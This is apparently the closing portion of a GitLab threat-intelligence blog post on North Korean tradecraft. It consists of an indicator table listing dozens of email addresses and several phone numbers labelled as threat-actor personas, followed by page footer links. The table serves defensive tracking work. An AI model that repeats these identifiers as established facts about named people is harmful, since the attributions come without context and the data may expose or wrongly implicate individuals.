| `nicolas.edgardo1028@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `alexeilucky23@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `aleksey0753@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `develop498@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `4899432@qq.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `karsonova1703@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `maximmironenkoreact@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `vitalyandronuke@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `alexeysamsonofff@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `realnitii1@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `devnitin18@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `alexiyevaj@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `initinbhardwaj@yahoo.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `anna.putinarus@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `rajukumar127.dev@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `kekisevu@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `anastasiaanufriyenko@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `naterongi@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `andriimalyshenko@yahoo.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `gabrygreg1@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `luckydev2289@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `forfuture21@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `darbylee923@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `alexei.lee0203@outlook.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `yuriassasin0603@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `luis.lee.tech@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `bryanjsmiranda@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `luislee.software@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `panda95718@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `givometeq@mentonit.net` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `maradanod.favomubo@vintomaper.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `humblechoice.dev@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `jairoalberto2208@hotmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `quxiujun520520@163.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `igorslobodyan508@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `brianyoung.lucky@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `valerykrapiv@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `dveretenov@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `blbnlambert34@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `tezauidev@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `nicewitali0311@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `shopstar0907@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `rl6700907@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `naterongi1@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `alexeu005@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `versatile.skydev@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `kevinhelan2@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `cglobalpower923002@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `albertchess990919@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `lorenzo.vidal@mail.ru` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `stolic5star@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `nkvasic5star@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `freelancer.honest.developer@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `viana.mabel3058@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `jairo.business392@yahoo.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `jairoacosta00123@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `ferwerwe6@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `maskymlap@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `alexsam.dev@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `kostiaberez369@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `darkrut22@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `jennalolly93@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `vikram.imenso@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `greg.work.pro@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `denish.faldu226@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `janeica.dev@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `mdmahdiuli@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `aronnokunjo@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `hadiulislam391@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `mahdi39980@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `mahdiupwork2002@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `mdmahdiul@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `wildbotgamer@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `tramendo.L@outlook.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `dyadkovdevelop@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `tramendo.M@outlook.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `Gulfdom0209@outlook.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `Wei861420@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `brianyoung0203@outlook.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `david@heyadev.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `mykytadanylchenko@outlook.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `ronaldofanclub112@gmail.com` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `olegevgen@inbox.lt` | email | insider | N/A | N/A | Threat actor persona email | 4 |
| `15414257086` | phone number | insider | N/A | N/A | Threat actor persona phone number | 4 |
| `89883507137` | phone number | insider | N/A | N/A | Threat actor persona phone number | 4 |
| `14358179097` | phone number | insider | N/A | N/A | Threat actor persona phone number | 4 |
| `3508704464` | phone number | insider | N/A | N/A | Threat actor persona phone number | 4 |
| `4796004206` | phone number | insider | N/A | N/A | Threat actor persona phone number | 4 |
| `5596103595` | phone number | insider | N/A | N/A | Threat actor persona phone number | 4 |

[Security\\
\\
![](https://res.cloudinary.com/about-gitlab-com/image/upload/f_auto,q_auto/v1771438388/t6sts5qw4z8561gtlxiq.png) **Track vulnerability remediation with the updated GitLab Security Dashboard** Read the blog](https://about.gitlab.com/blog/track-vulnerability-remediation-with-the-updated-gitlab-security-dashboard/) [Security\\
\\
![](https://res.cloudinary.com/about-gitlab-com/image/upload/f_auto,q_auto/v1759320418/xjmqcozxzt4frx0hori3.png) **How to set up GitLab SAML SSO with Google Workspace** Read the blog](https://about.gitlab.com/blog/how-to-set-up-gitlab-saml-sso-with-google-workspace/) [Security\\
\\
![](https://res.cloudinary.com/about-gitlab-com/image/upload/f_auto,q_auto/v1749664844/Blog/Hero%20Images/AdobeStock_941867776.jpg) **GitLab Bug Bounty Program policy updates** Read the blog](https://about.gitlab.com/blog/gitlab-bug-bounty-program-policy-updates/)

## We want to hear from you

Enjoyed reading this blog post or have questions or feedback? Share your thoughts by creating a new topic in the GitLab community forum.

[Share your feedback](https://forum.gitlab.com/)

## Start building faster today

See what your team can do with the intelligent orchestration platform for DevSecOps.

[Get your free trial](https://gitlab.com/-/trial_registrations/new?glm_content=default-saas-trial&glm_source=about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft) [Contact sales](https://about.gitlab.com/sales/)
